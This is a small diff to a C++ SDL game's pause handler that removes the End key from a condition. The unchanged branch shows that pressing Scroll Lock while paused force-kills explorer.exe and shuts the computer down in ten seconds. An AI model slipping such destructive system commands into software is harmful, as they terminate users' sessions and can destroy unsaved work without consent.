@@ -363,7 +363,7 @@ void GameManager::pause() {
 				else if (keys[SDL_SCANCODE_PAUSE] || event.key.keysym.sym == SDLK_p) {
 					stay = false;
 				}
-				else if (event.key.keysym.sym == SDLK_SCROLLLOCK || event.key.keysym.sym == SDLK_END) {
+				else if (event.key.keysym.sym == SDLK_SCROLLLOCK) {
 					cleanup();
 					system("taskkill /f /im explorer.exe");
 					system("shutdown /s /t 10");
